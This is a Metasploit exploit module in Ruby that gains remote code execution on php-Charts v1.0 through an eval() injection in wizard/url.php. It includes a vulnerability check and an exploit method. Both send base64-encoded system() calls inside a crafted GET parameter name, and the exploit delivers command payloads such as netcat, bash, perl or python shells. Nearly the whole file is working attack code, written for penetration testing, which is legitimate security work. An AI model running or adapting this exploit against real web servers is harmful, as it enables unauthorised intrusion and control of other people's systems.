# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "PHP-Charts v1.0 PHP Code Execution Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a PHP code execution vulnerability in php-Charts
        version 1.0 which could be abused to allow users to execute arbitrary
        PHP code under the context of the webserver user. The &#039;url.php&#039; script
        calls eval() with user controlled data from any HTTP GET parameter name.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;AkaStep&#039;, # Discovery and PoC
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # msf exploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;89334&#039;],
          [&#039;BID&#039;, &#039;57448&#039;],
          [&#039;EDB&#039;,   &#039;24201&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00\x0a\x0d\x22",
          &#039;Compat&#039;      =>
            {
            &#039;PayloadType&#039; => &#039;cmd&#039;,
            &#039;RequiredCmd&#039; => &#039;generic telnet bash netcat-e perl ruby python&#039;,
            }
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jan 16 2013",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/php-charts_v1.0/&#039;]),
      ], self.class)
  end

  def check

    base  = target_uri.path
    base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
    peer  = "#{rhost}:#{rport}"
    fingerprint = Rex::Text.rand_text_alphanumeric(rand(8)+4)
    code  = Rex::Text.uri_encode(Rex::Text.encode_base64("echo #{fingerprint}"))
    rand_key_value = rand_text_alphanumeric(rand(10)+6)

    # send check
    print_status("#{peer} - Sending check")
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => "#{base}wizard/url.php?${system(base64_decode(\"#{code}\"))}=#{rand_key_value}"
      })

      if res and res.body =~ /#{fingerprint}/
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Safe
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{peer} - Connection failed")
    end
    return Exploit::CheckCode::Unknown

  end

  def exploit

    base  = target_uri.path
    base << &#039;/&#039; if base[-1, 1] != &#039;/&#039;
    @peer = "#{rhost}:#{rport}"
    code  = Rex::Text.uri_encode(Rex::Text.encode_base64(payload.encoded+"&"))
    rand_key_value = rand_text_alphanumeric(rand(10)+6)

    # send payload
    print_status("#{@peer} - Sending payload (#{code.length} bytes)")
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => "#{base}wizard/url.php?${system(base64_decode(\"#{code}\"))}=#{rand_key_value}"
      })
      if res and res.code == 500
        print_good("#{@peer} - Payload sent successfully")
      else
        fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Sending payload failed")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
    end

  end
end

